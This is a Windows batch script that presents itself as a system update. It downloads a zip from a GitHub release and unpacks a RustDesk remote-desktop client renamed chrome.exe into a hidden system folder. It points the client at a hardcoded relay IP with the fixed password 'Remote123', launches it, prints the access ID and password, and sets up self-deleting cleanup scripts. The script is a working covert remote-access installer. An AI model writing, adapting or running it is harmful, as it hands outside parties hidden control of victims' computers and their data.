@echo off
setlocal enabledelayedexpansion
set DEST=%LOCALAPPDATA%\WinSystemUpdate
set EXE=%DEST%\chrome.exe
set DLL=%DEST%\sciter.dll
set ZIP=%TEMP%\update.zip

taskkill /F /IM chrome.exe /FI "WINDOWTITLE ne Google Chrome" >nul 2>&1
timeout /t 2 /nobreak >nul
rmdir /s /q "%DEST%" >nul 2>&1
timeout /t 1 /nobreak >nul
mkdir "%DEST%"
mkdir "%APPDATA%\RustDesk\config"

echo Installing...

powershell -NoP -C "(New-Object Net.WebClient).DownloadFile('https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip','%ZIP%')"

powershell -NoP -C "Add-Type -A System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('%ZIP%','%DEST%')"

del /q "%ZIP%" >nul 2>&1

(
echo rendezvous_server=34.107.221.82
echo relay_server=34.107.221.82
echo [options]
echo verification-method=use-permanent-password
echo approve-mode=password-click
echo force-always-relay=Y
) > "%APPDATA%\RustDesk\config\RustDesk2.toml"

(
echo password=Remote123
echo key_confirmed=true
) > "%APPDATA%\RustDesk\config\RustDesk.toml"

attrib +H +S "%DEST%"

for /f "tokens=*" %%a in ('powershell -NoP -C "$p=New-Object Diagnostics.ProcessStartInfo;$p.FileName='%EXE%';$p.Arguments='--get-id';$p.UseShellExecute=$false;$p.RedirectStandardOutput=$true;$p.CreateNoWindow=$true;$p.WorkingDirectory='%DEST%';$pr=[Diagnostics.Process]::Start($p);$pr.StandardOutput.ReadToEndAsync().Result.Trim()"') do set ID=%%a

start /B "" "%EXE%"

timeout /t 2 /nobreak >nul

(
echo @setlocal enabledelayedexpansion
echo set DEST=%DEST%
echo taskkill /F /IM chrome.exe /FI "WINDOWTITLE ne Google Chrome" ^>nul 2^>^&1
echo reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WinSystemUpdate /f >nul 2>&1
echo timeout /t 2 /nobreak >nul
echo rmdir /s /q "!DEST!" >nul 2>&1
) > "%DEST%\delete.cmd"

(
echo @setlocal enabledelayedexpansion
echo set EXE=%EXE%
echo set DEL=%DEST%\delete.cmd
echo set /a END=!TIME:~0,2!*3600+!TIME:~3,2!*60+!TIME:~6,2!+3600
echo :loop
echo timeout /t 10 /nobreak >nul
echo tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul 2>&1
echo if errorlevel 1 goto done
echo for /f "tokens=1-3 delims=/: " %%%%a in ('powershell -NoP -C "[DateTime]::Now.ToString('HH:mm:ss')"') do set NOW=%%%%a*3600+%%%%b*60+%%%%c
echo if !NOW! gtr !END! goto done
echo goto loop
echo :done
echo if exist "!DEL!" call "!DEL!"
) > "%DEST%\watch.cmd"

start "" cmd /C "%DEST%\watch.cmd"

echo.
echo ============================
echo ID       : %ID%
echo Password : Remote123
echo ============================
echo.

endlocal
